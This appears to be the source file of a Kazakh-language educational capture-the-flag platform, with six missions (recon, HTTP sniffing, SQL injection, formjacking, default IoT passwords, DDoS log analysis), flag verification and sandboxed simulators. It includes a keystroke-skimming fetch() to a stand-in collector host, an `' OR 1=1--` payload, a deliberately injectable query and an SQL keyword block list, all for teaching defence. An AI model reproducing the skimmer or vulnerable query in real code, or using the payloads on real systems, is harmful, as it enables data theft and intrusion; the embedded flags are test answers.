"""
CyberArena Mission Engine & Sandboxed Simulators.
All flags are verified server-side via SHA-256 hashes; no plaintext flags
are ever embedded in client-facing mission descriptions.
"""

from __future__ import annotations

import hashlib
import hmac
import sqlite3
from typing import Any


def hash_flag(flag: str) -> str:
    """Return SHA-256 hex digest of a normalized flag string."""
    return hashlib.sha256(flag.strip().encode("utf-8")).hexdigest()


# Server-side flag hashes (never sent to clients)
FLAG_HASHES: dict[str, str] = {
    "m01_recon": hash_flag("FLAG{KEIN_SYSTEM_IST_SICHER_01}"),
    "m02_sniff": hash_flag("FLAG{CLEARTEXT_HTTP_LEAK_7742}"),
    "m03_sqli": hash_flag("FLAG{PREPARED_STATEMENTS_STOP_SQLI}"),
    "m04_formjack": hash_flag("FLAG{CSP_BLOCKS_FORMJACKING_JS}"),
    "m05_camera": hash_flag("FLAG{NEVER_KEEP_DEFAULT_CAM_PASS}"),
    "m06_ddos": hash_flag("FLAG{RATE_LIMIT_SHIELD_198_51_100}"),
}


MISSIONS: list[dict[str, Any]] = [
    {
        "id": "m01_recon",
        "code": "OP-01",
        "category": "RECON / OSINT",
        "difficulty": "Оңай",
        "points": 100,
        "title": "MRX-тің ізі",
        "story": (
            "«Бірде-бір жүйе қауіпсіз емес.» Даркнеттегі жабық чатқа кіру "
            "үшін бастапқы барлау жүргіз. Әкімшілер кейде іздеу жүйелерінен "
            "жасырғысы келген папкаларын `robots.txt` файлында ашық қалдырады."
        ),
        "objective": (
            "Арена серверіндегі `/robots.txt` жолын тексеріп, жасырын "
            "қауіпсіздік есебіндегі флагты тап."
        ),
        "hint": "Терминалда `curl /robots.txt` немесе браузерде осы сайттың соңына `/robots.txt` қосып аш. Сосын шыққан жасырын жолды тексер.",
        "simulator_type": "terminal_hint",
        "defense_takeaway": (
            "Құпия панельдер мен ішкі файлдарды ешқашан `robots.txt` арқылы "
            "жасыруға тырыспаңыз — оны кез келген сканер бірінші болып оқиды. "
            "Оларды авторизациямен (Auth) жабу керек."
        ),
    },
    {
        "id": "m02_sniff",
        "code": "OP-02",
        "category": "NETWORK / SNIFFING",
        "difficulty": "Оңай",
        "points": 150,
        "title": "Ашық Wi-Fi торы",
        "story": (
            "Қолданушы кафедегі ашық Wi-Fi арқылы HTTPS-сіз (жай HTTP-мен) "
            "логин бетіне кірді. Кіреберісте ол сандар мен құпия сөзін жазды, "
            "ал желілік тыңдаушы (Sniffer) пакетті сол күйі ұстап алды."
        ),
        "objective": (
            "Төмендегі ұсталған желілік пакетті (HTTP POST) талдап, Base64-пен "
            "кодталған `X-Secret-Token` өрісін шеш және флагты ал."
        ),
        "hint": "Терминалда `decode base64 <мәтін>` командасын қолданып көр.",
        "simulator_type": "packet_log",
        "artifact": (
            "POST /api/legacy-login HTTP/1.1\n"
            "Host: portal-legacy.internal\n"
            "Content-Type: application/x-www-form-urlencoded\n"
            "X-Secret-Token: RkxBR3tDTEVBUlRFWFRfSFRUUF9MRUFLXzc3NDJ9\n\n"
            "pin_code=482910&card_last4=9901"
        ),
        "defense_takeaway": (
            "Барлық авторизация мен дерек алмасу тек TLS/HTTPS арқылы жүруі "
            "тиіс. HSTS қосылмаса, ашық желіде деректерді кез келген адам оқи алады."
        ),
    },
    {
        "id": "m03_sqli",
        "code": "OP-03",
        "category": "WEB / SQL INJECTION",
        "difficulty": "Орташа",
        "points": 250,
        "title": "Темір есікті алдау",
        "story": (
            "Берлиндегі мұрағат жүйесіне кіру терезесінде SQL сұраныс "
            "пайдаланушы жазған мәтінмен тікелей біріктіріледі (string "
            "concatenation). Мұндай қателік парольді білмей-ақ админ болып "
            "кіруге жол ашады."
        ),
        "objective": (
            "Төмендегі оқшауланған SQL симуляторында логин өрісі арқылы "
            "`admin` аккаунтына кіріп, ішіндегі флагты оқы."
        ),
        "hint": "Username жолына `' OR 1=1--` жазып, SQL сұранысының қалай өзгеретінін бақыла.",
        "simulator_type": "sqli_lab",
        "defense_takeaway": (
            "Дерекқорға сұраныс жібергенде ешқашан жолдарды тікелей қоспаңыз "
            "(`f\"...{user}...\"`). Әрдайым параметризацияланған сұраныстар "
            "(Prepared Statements: `WHERE username = ?`) қолданыңыз."
        ),
    },
    {
        "id": "m04_formjack",
        "code": "OP-04",
        "category": "CLIENT / FORMJACKING",
        "difficulty": "Орташа",
        "points": 250,
        "title": "Кіреберістегі тыңшы",
        "story": (
            "Қолданушы сайттың кіреберіс формасына сандар мен кодын терген "
            "сәтте, бөгде скрипт пернетақта басуларын ұрлап сыртқа жіберіп "
            "жатқаны анықталды (Formjacking / Magecart шабуылы)."
        ),
        "objective": (
            "Төмендегі залалданған беттің бастапқы кодын талдап, деректер қай "
            "күдікті доменге жіберіліп жатқанын және қорғаушы кодта жасырынған "
            "флагты тап (шифрды HEX-тен аш)."
        ),
        "hint": "Кодтағы `fetch(...)` ішіндегі HEX немесе терминдерге назар аудар. Терминалда `decode hex <мәтін>` қолдануға болады.",
        "simulator_type": "code_audit",
        "artifact": (
            "// Тексерілетін сайттағы күдікті скрипт фрагменті:\n"
            "document.getElementById('pin-input').addEventListener('input', (e) => {\n"
            "  const stolen = e.target.value;\n"
            "  // Тек шабуылдаушы серверіне тығып жіберу (Formjacking):\n"
            "  const payload = '464c41477b4353505f424c4f434b535f464f524d4a41434b494e475f4a537d';\n"
            "  fetch('https://evil-collector.invalid/collect?d=' + encodeURIComponent(stolen));\n"
            "});\n\n"
            "// Дұрыс қорғаныс (HTTP Header):\n"
            "// Content-Security-Policy: default-src 'self'; script-src 'self'; connect-src 'self';"
        ),
        "defense_takeaway": (
            "XSS пен Formjacking-тен қорғану үшін қатаң Content-Security-Policy "
            "(CSP) орнатып, `connect-src 'self'` арқылы браузердің бөгде "
            "серверлерге дерек жіберуіне тыйым салу қажет."
        ),
    },
    {
        "id": "m05_camera",
        "code": "OP-05",
        "category": "IOT / ACCESS CONTROL",
        "difficulty": "Орташа",
        "points": 200,
        "title": "Көлеңкелі камера",
        "story": (
            "Серверлік бөлмедегі `SECURE-VIEW™` IP-камерасында әкімші "
            "зауыттан келген стандартты құпия сөзді ауыстыруды ұмытып кеткен. "
            "CLAY тобы физикалық серверге кірмес бұрын камераны тексереді."
        ),
        "objective": (
            "Камера конфигурациясының аудитін аяқта: зауыттық құпия сөзді "
            "тауып, қауіпсіздік жүйесі беретін флагты ал."
        ),
        "hint": "Төмендегі симуляторда жиі кездесетін әдепкі камера парольдерін (`admin`, `camera123`, `12345`) тексеріп көр.",
        "simulator_type": "camera_lab",
        "defense_takeaway": (
            "IoT құрылғылары мен админ панельдерінде зауыттық парольді бірінші "
            "күні ауыстырып, Brute-Force шабуылына қарсы Rate Limiting қосу міндетті."
        ),
    },
    {
        "id": "m06_ddos",
        "code": "OP-06",
        "category": "BLUE TEAM / ANTI-DDOS",
        "difficulty": "Күрделі",
        "points": 300,
        "title": "Қалқан (Blue Team)",
        "story": (
            "Сіздің қорғайтын серверіңізге DDoS ботнеті шабуыл жасап жатыр. "
            "Ақылды қорғаушы тек шабуылды көріп қоймай, логтардан нақты қай "
            "желілік подсеть (subnet) флуд жіберіп тұрғанын тауып бұғаттайды."
        ),
        "objective": (
            "Төмендегі Nginx access.log үзіндісін талдап, секундына тым көп "
            "сұраныс жіберіп жатқан ботнет подсетін (`XXX.XX.XXX.0/24`) "
            "симуляторға енгізіп, WAF қалқанын іске қос."
        ),
        "hint": "Логта `BotFlood/1.0` User-Agent-пен 404/503 тудырып жатқан IP адрестердің алғашқы 3 октетін қара.",
        "simulator_type": "ddos_lab",
        "artifact": (
            '192.0.2.14 - - [17/Nov/2026:11:01:02] "GET / HTTP/1.1" 200 4120 "-" "Mozilla/5.0"\n'
            '198.51.100.41 - - [17/Nov/2026:11:01:02] "GET /login?r=1 HTTP/1.1" 429 190 "-" "BotFlood/1.0"\n'
            '198.51.100.42 - - [17/Nov/2026:11:01:02] "GET /login?r=2 HTTP/1.1" 429 190 "-" "BotFlood/1.0"\n'
            '198.51.100.88 - - [17/Nov/2026:11:01:02] "POST /api/auth HTTP/1.1" 429 190 "-" "BotFlood/1.0"\n'
            '203.0.113.9 - - [17/Nov/2026:11:01:03] "GET /assets/app.js HTTP/1.1" 200 18200 "-" "Mozilla/5.0"\n'
            '198.51.100.105 - - [17/Nov/2026:11:01:03] "GET /login?r=3 HTTP/1.1" 429 190 "-" "BotFlood/1.0"'
        ),
        "defense_takeaway": (
            "Layer-7 DDoS-тан қорғану үшін Cloudflare WAF, Nginx `limit_req_zone` "
            "және күдікті подсеттерді автоматты бұғаттайтын Fail2ban қолданылады."
        ),
    },
]


def get_public_missions() -> list[dict[str, Any]]:
    """Return mission metadata safe to send to clients (without flag hashes)."""
    return list(MISSIONS)


def verify_flag(mission_id: str, submitted_flag: str) -> bool:
    """Verify submitted flag using constant-time comparison against SHA-256 hash."""
    expected = FLAG_HASHES.get(mission_id)
    if not expected:
        return False
    actual = hash_flag(submitted_flag)
    return hmac.compare_digest(actual, expected)


def run_sandboxed_sqli(username: str, password: str) -> dict[str, Any]:
    """
    Isolated educational SQL injection simulator.
    Runs inside a brand-new ephemeral in-memory SQLite DB with no filesystem
    or main database access, strictly read-only simulation.
    """
    if len(username) > 120 or len(password) > 120:
        return {
            "ok": False,
            "query": "",
            "error": "Енгізу тым ұзын (макс. 120 таңба).",
        }

    # Block destructive stacked statements in educational simulator
    lowered = f"{username} {password}".lower()
    for forbidden in (";", "attach ", "pragma ", "load_extension", "drop ", "delete ", "insert ", "update "):
        if forbidden in lowered:
            return {
                "ok": False,
                "query": "",
                "error": f"Оқу симуляторында '{forbidden.strip()}' операторына тыйым салынған. Тек SELECT шартын алдап көр!",
            }

    mem = sqlite3.connect(":memory:")
    try:
        mem.execute("CREATE TABLE operators (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT, secret_note TEXT)")
        mem.execute(
            "INSERT INTO operators (username, password, role, secret_note) VALUES (?, ?, ?, ?)",
            ("admin", "S3cur3_CLAY_99!", "ROOT", "FLAG{PREPARED_STATEMENTS_STOP_SQLI}"),
        )
        mem.execute(
            "INSERT INTO operators (username, password, role, secret_note) VALUES (?, ?, ?, ?)",
            ("guest", "guest123", "USER", "No secrets here."),
        )

        # Intentionally vulnerable query ONLY inside this isolated in-memory sandbox
        vulnerable_query = (
            f"SELECT username, role, secret_note FROM operators "
            f"WHERE username = '{username}' AND password = '{password}'"
        )
        try:
            row = mem.execute(vulnerable_query).fetchone()
        except sqlite3.Error as exc:
            return {
                "ok": False,
                "query": vulnerable_query,
                "error": f"SQL Syntax Error: {exc}",
            }

        if row:
            return {
                "ok": True,
                "query": vulnerable_query,
                "user": row[0],
                "role": row[1],
                "secret_note": row[2],
                "defense_tip": "Көрдіңіз бе? Prepared Statement (`?`) қолданылмағандықтан SQL сұраныстың логикасы бұзылды!",
            }
        return {
            "ok": False,
            "query": vulnerable_query,
            "error": "Логин немесе пароль қате (нәтиже бос).",
        }
    finally:
        mem.close()


def run_sandboxed_camera_login(username: str, password: str) -> dict[str, Any]:
    """Educational IoT camera login simulator."""
    if username.strip() == "admin" and password.strip() == "camera123":
        return {
            "ok": True,
            "device": "CAM-04-SERVER-ROOM (Firmware v4.8.2)",
            "flag": "FLAG{NEVER_KEEP_DEFAULT_CAM_PASS}",
            "message": "Зауыттық пароль арқылы камераға кіру расталды!",
        }
    return {
        "ok": False,
        "message": "Қате логин немесе пароль (HTTP 401 Unauthorized).",
    }


def run_sandboxed_ddos_mitigation(subnet: str) -> dict[str, Any]:
    """Educational Blue Team Anti-DDoS rule simulator."""
    cleaned = subnet.strip()
    if cleaned in ("198.51.100.0/24", "198.51.100"):
        return {
            "ok": True,
            "rule": "deny 198.51.100.0/24; # WAF Rate-Limit Active",
            "flag": "FLAG{RATE_LIMIT_SHIELD_198_51_100}",
            "message": "Шабуылдаушы ботнет подсеті сәтті оқшауланды! Трафик тазартылды.",
        }
    return {
        "ok": False,
        "message": "Бұл подсеть логтардағы шабуылдаушы ботнетке сәйкес келмейді. Мысалы: XXX.XX.XXX.0/24 форматында енгізіп көр.",
    }
